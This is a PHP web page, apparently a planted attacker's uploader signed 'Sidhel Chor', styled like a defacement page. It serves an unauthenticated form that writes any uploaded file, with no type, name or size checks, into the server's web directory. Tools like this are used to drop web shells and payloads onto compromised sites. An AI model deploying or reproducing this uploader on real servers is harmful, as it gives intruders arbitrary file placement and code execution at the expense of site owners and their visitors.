<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title>Personal File Uploader</title>
   <meta name="generator" content="Sidhel Chor" />
<meta name="author" content="Sidhel Chor" />
<meta name="description" content="[ Sidhel Chor ]" />
<style>
body {
    background: #000000 url(https://i.imgur.com/E5gN1eK.gif) scroll repeat center center;
    color: silver;
    font-family: Comic Sans MS;
    font-size: 14px;
    font-weight: bold
}
#black{
    text-align: center;
    font-size:14px;
    font-weight: bold;
}
a:link, a:visited {font-weight:normal; text-decoration:none; color:silver;}
a:hover {font-weight:bold; text-decoration:none; cursor:default;}

</style>
</head>

<body>
<?php
    $myUpload = new maxUpload(); 
    //$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
    $myUpload->uploadFile();
?>
<?php

class maxUpload{
    var $uploadLocation;
    

    function maxUpload(){
        $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
    }


    function setUploadLocation($dir){
        $this->uploadLocation = $dir;
    }
    
    function showUploadForm($msg='',$error=''){
?>
       <div id="container">
            <center><b>Sidhel Chor.. ;)</b></center><br/>
<?php
if ($msg != ''){
    echo '<p class="msg">'.$msg.'</p>';
} else if ($error != ''){
    echo '<p class="emsg">'.$error.'</p>';

}
?>
                <form action="" method="post" enctype="multipart/form-data" >
                     <center>
                         <label><b>File: </b>
                             <input name="myfile" type="file" size="30" />
                         </label>
                         <label>
                             <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
                         </label>
                     </center>
                 </form>
             </div>
          
<?php
    }

    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this->showUploadForm();
        } else {
            $msg = '';
            $error = '';
            
            //Check destination directory
            if (!file_exists($this->uploadLocation)){
                $error = "The target directory doesn't exists!";
            } else if (!is_writeable($this->uploadLocation)) {
                $error = "The target directory is not writeable!";
            } else {
                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);

                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename( $_FILES['myfile']['name']).
                    " was uploaded successfully!";
                } else{
                    $error = "The upload process failed!";
                }
            }

            $this->showUploadForm($msg,$error);
        }

    }

}
?>
</body>   
<?php /*
*/
?>
